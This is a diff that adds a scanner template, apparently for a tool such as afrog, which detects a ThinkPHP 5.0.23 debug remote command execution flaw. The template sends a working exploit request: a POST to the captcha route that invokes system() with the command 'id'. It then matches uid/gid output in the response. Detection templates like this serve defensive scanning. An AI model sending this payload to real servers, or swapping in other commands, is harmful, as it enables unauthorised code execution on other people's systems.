@@ -1,0 +1,18 @@
+id: thinkphp-5.0.23-rce
+
+info:
+  name: Thinkphp debug 执行任意命令
+  author: zan8in
+  severity: critical
+  verified: false
+  tags: thinkphp,rce
+  created: 2024/01/07
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php?s=captcha
+      body: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+    expression: '"((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)'
+expression: r0()
